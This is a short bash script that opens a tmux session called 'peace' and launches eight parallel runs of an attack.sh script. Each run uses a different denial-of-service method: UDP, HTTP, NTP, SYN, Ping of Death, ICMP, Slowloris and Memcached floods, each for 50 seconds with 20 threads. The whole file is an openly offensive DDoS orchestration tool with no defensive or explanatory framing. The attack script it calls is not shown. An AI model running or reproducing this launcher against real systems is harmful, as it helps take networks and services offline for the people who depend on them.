#!/usr/bin/env bash

tmux kill-session -t "peace" 2>/dev/null
tmux new-session -d -s "peace" "./attack.sh --method UDP --time 50 --threads 20" \; \
  split-window -dh "./attack.sh --method HTTP --time 50 --threads 20" \; \
  split-window -dh "./attack.sh --method NTP --time 50 --threads 20" \; \
  split-window -dh "./attack.sh --method SYN --time 50 --threads 20" \; \
  split-window -dv -t 0 "./attack.sh --method POD --time 50 --threads 20" \; \
  split-window -dv -t 2 "./attack.sh --method ICMP --time 50 --threads 20" \; \
  split-window -dv -t 4 "./attack.sh --method Slowloris --time 50 --threads 20" \; \
  split-window -dv -t 6 "./attack.sh --method Memcached --time 50 --threads 20" \; \
attach
